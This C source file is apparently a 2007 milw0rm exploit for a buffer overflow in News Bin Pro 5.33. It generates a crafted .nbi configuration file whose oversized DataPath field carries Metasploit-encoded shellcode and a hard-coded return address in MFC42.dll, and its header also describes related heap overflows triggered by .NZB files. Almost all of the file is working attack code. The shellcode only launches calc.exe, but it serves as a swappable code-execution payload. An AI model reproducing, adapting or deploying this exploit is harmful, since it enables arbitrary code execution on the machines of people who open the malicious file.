/***************************************************************************\
*                                                                           *
* News Bin Pro 5.33 .NBI File Buffer Overflow exploit                       *
*                                                                           *
*                                                                           *
* There are 2 buffer overflow in News Bin Pro 5.33 that can be triggered    *
* by a crafted .nbi config file.                                            *
* DataPath and DownloadPath sizes are not checked and code execution is     *
* possible.                                                                 *
*                                                                           *
* This vulnerability also exists in News Bin 4.x but since .nbi is not      *
* associated with News Bin this can only be triggered by loading the file   *
* manually.                                                                 *
*                                                                           *
* I would also add that:                                                    *
* -News Bin 4.x is vulnerable to a heap overflow with a .NZB file that      *
*  contains a long group field. The vulnerability is triggered after having *
*  started download a malformed post.                                       *
*  Impact: DoS for XP SP2, Code exec for XP SP1 and XP.                     *
*                                                                           *
* -News Bin 5.33 is vulnerable to a heap overflow with a .NZB file that     *
*  contains a long group field. The vulnerability is triggered after having *
*  started download a malformed post and after having clicked on            *
*  "Delete All Posts".                                                      *
*  Impact: Code exec on XP, XP SP1, DoS on XP SP2, but code exec might be   *
*  possible (Im not sure).                                                  *
*                                                                           *
* Tested on XP SP2 FR.                                                      *
* Coded and discovered by Marsu <MarsupilamiPowa@hotmail.fr>                *
*                                                                           *
*   Note: thx aux Bananas et a la KryptonIT. Bon courage aux inuITs :P      *
\***************************************************************************/


#include "stdlib.h"
#include "stdio.h"
#include "string.h"


/* win32_exec -  EXITFUNC=thread CMD=calc.exe Size=164 Encoder=Pex http://metasploit.com */
/*BAD CHARS ARE 0x00 0x5D 0x5b 0x0a 0x0d*/
char calcshellcode[] =
"\x33\xc9\x83\xe9\xdd\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x26"
"\x50\xbf\x4b\x83\xee\xfc\xe2\xf4\xda\xb8\xfb\x4b\x26\x50\x34\x0e"
"\x1a\xdb\xc3\x4e\x5e\x51\x50\xc0\x69\x48\x34\x14\x06\x51\x54\x02"
"\xad\x64\x34\x4a\xc8\x61\x7f\xd2\x8a\xd4\x7f\x3f\x21\x91\x75\x46"
"\x27\x92\x54\xbf\x1d\x04\x9b\x4f\x53\xb5\x34\x14\x02\x51\x54\x2d"
"\xad\x5c\xf4\xc0\x79\x4c\xbe\xa0\xad\x4c\x34\x4a\xcd\xd9\xe3\x6f"
"\x22\x93\x8e\x8b\x42\xdb\xff\x7b\xa3\x90\xc7\x47\xad\x10\xb3\xc0"
"\x56\x4c\x12\xc0\x4e\x58\x54\x42\xad\xd0\x0f\x4b\x26\x50\x34\x23"
"\x1a\x0f\x8e\xbd\x46\x06\x36\xb3\xa5\x90\xc4\x1b\x4e\xbf\x71\xab"
"\x46\x38\x27\xb5\xac\x5e\xe8\xb4\xc1\x33\xde\x27\x45\x7e\xda\x33"
"\x43\x50\xbf\x4b";




char rest[]="DownloadPath=path\nDiskThreshold=0\nCacheTimeout=14\nUseRateLimit=0\nPurgeRecords=0\nMaxRetries=10\nInitRecords=500000\nThumbCount=3\nUpdateWhenStarted=0\nRecycleServers=0\nShowPAR=0\nSortIgnoreRE=1\nHideIncompletes=0\nMultiTab=1\nAutoOLD=0\nScratchPars=1\nRestartPauseTime=60\nHiRes=0\nUseBwScreenSaver=0\nUseBwTimers=0\nUseBwTimeLimit=0\nLimitOnTime=0\nLimitOffTime=0\nRateLimit=0\nSigCache=1\nAutoSave=1\nAutoShutdown=0\nShowMotd=0\nAssemblePrio=1\nStrictYENC=0\nAutoAssemble=0\nInitBrowsePath=0\nOldPicker=1\nChunkPurge=3\nAutosaveInterva=10\nPostLimiter=0\nMaxPosts=0\n\n"
"[Logging]\nLogging=0\nLogErrors=0\nLogFiles=0\nLogHeaders=0\nLogBody=0\nLogOverwrite=0\n\n"
"[Debug]\nShowCommands=1\n\n"
"[TABS]\nGroupsPos=0\nDownloadPos=2\nScratchPos=2\nFailedPos=2\nFilesPos=2\nShowAutoRAR=1\nAutoRARPos=2\nShowSearch=0\nSearchPos=1\nShowConnections=1\nConnectionPos=2\nShowStatus=1\nStatusPos=2\nShowThumbNails=1\nThumbsPos=2\nShowServers=1\nServersPos=0\nPostsPos=1\nRPBPos=1\nImageDbasePos=1\nDownloadHistoryPos=1\n\n"
"[DESCRIPTIONS]\nFileDescriptions=0\nDescSubject=1\nDescFrom=1\nDescDate=0\n\n"
"$[Filename]\nAutoRename=1\nDirectoryMode=1\nMP3_TagMode=0\n\n"
"[IMAGESAFE]\nImageSafe=0\n\n"
"[Nzb]\nNZB_ObeyGlobal=0\nNZB_DD_Autoload=1\nNZB_ClickToPost=0\nNZB_LoadSingle=0\nNZB_PathClean=1\nNZB_PathCleanRE=^(\\d+_)|(msgid_\\d+_)\nNZB_ScanFolder\nNZB_NameFolder=1\nNZB_AutoToPost=0\n\n"
"[Unsorted]\nFilterProfile=Global\nActive=1\nIsExpanded=1\n\n"
"[Groups]\nalt.binaries.pictures.autos\n\n"
"[alt.binaries.pictures.autos]\nFilterProfile=Global\nActive=1\nParent=Automobiles\n\n"
"[Automobiles]\nFilterProfile=Global\nActive=1\nIsExpanded=1\n\n"
"[Topics]\nAutomobiles\n\n"
"[My_Server]\nAddress=news.free.fr\nActive=1\nUseAuth=0\nPort=119\nSlaveServer=0\nFillServer=0\nConnectionLimit=2\nPriority=0\nBytesDownloaded=0\nUseFirewall=1\nColor=10547360\n\n"
"[Servers]\nMy_Server\n";




char defaultfilename[]="file.nbi";

int main(int argc, char* argv[]) {

FILE *file;
char * pad;
char *filename;
char *myshell;

printf("[+] Newsbin Pro 5.33 Configuration file DataPath Buffer Overflow Exploit\n");
printf("[+] Coded and discovered by Marsu <Marsupilamipowa@hotmail.fr>\n");
myshell=calcshellcode;

file=fopen(defaultfilename,"wb");

pad = (char*)malloc(sizeof(char)*520);
memset(pad,'A',520);

// call [esp+C] in MFC42.dll. I took the first I got. Dont think this is universal! 
// Play with that if it doesnt work, or look for a pop pop pop ret.
memcpy(pad+512,"\xb6\x82\xdb\x73\x00",5);
memcpy(pad,myshell,strlen(myshell));
									
fprintf(file,"\n[Settings]\nDataPath=");
fprintf(file,pad);
fprintf(file,"\n");
fprintf(file,rest);
fclose(file);

printf("[+] File generated! Have fun\n");
return 0;
}

// milw0rm.com [2007-02-21]
